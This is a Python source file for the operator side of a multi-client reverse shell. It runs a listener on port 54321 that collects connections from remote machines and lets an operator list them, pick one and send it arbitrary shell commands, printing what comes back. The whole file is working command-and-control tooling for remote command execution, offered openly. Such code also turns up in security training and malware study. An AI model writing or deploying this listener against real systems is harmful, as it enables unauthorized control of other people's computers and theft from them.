#!/usr/bin/env python3

import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

#what to display in the help menu
COMMANDS = {'help':['Displays the list of available commands'],
            'list':['Display list of connected clients'],
            'select':['Use this command, followed by the index number of client you wish to connect to'],
            'quit':['When you are connected to a client, this will break that connection'],
            'shutdown':['Shuts server down'],
           }

class MultiServer(object):

    def __init__(self):
        self.host = ''                  #declare a host
        self.port = 54321               #declare a port
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit)
        signal.signal(signal.SIGTERM, self.quit)
        return

    def quit(self, signal=None, frame=None):
        print('\nQuitting')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):                    #create server socket connection
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))         #error if fails
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return


#bind socket/port and listen for connections
    def socket_bind(self):
        try:
            self.socket.bind((self.host, self.port))    #if it binds successfully, wait for client
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))    #if binding fails, show an error
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):       #accept multiple connections and append to a list
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()    #accept connection from client and create a socket
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                continue                                                #keep looking for more connections
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_shell(self):                  #brings up the shell to give commands
        while True:
            cmd = input('shell> ')          #shows that you are in the shell for commands
            if cmd == 'list':               #displays available connections
                self.list_connections()
                continue
            elif 'select' in cmd:                       #connects to chosen client
                client, conn = self.get_client(cmd)
                if conn is not None:
                    self.send_client_commands(client, conn)
            elif cmd == 'shutdown':                         #shuts down server
                    queue.task_done()
                    queue.task_done()
                    print('Server shutdown')
                    break
            elif cmd == 'help':                     #displays command options
                self.print_help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):                     #keep track of all client connections
        results = ''
        for i, conn in enumerate(self.all_connections):         #use auto count function to keep track
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)                                #max bytes
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            #make a somewhat graphic user interface
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Available Client Connections -----' + '\n' + results)
        return

    def get_client(self, cmd):              #get the selected client
        client = cmd.split(' ')[-1]
        try:
            client = int(client)
        except:
            print('The proper selection should be one of the numbers on the left of the list')
            return None, None
        try:
            conn = self.all_connections[client]
        except IndexError:
            print('That is not a valid option')
            return None, None
        print("You are now connected to " + str(self.all_addresses[client][2]))
        return client, conn
    
    
    def read_command_output(self, conn):    #checking the length and making it an integer
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):         #receive bytes or return none
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_client_commands(self, client, conn):       #connect to the client to send commands
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break
        del self.all_connections[client]
        del self.all_addresses[client]
        return


def create_workers():       #create worker threads
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):       #define the threads
    while True:
        x = queue.get()
        if x == 1:                  #this one manages the connections
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:                  #this one manages the commands
            server.start_shell()
        queue.task_done()
    return

def create_jobs():          
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
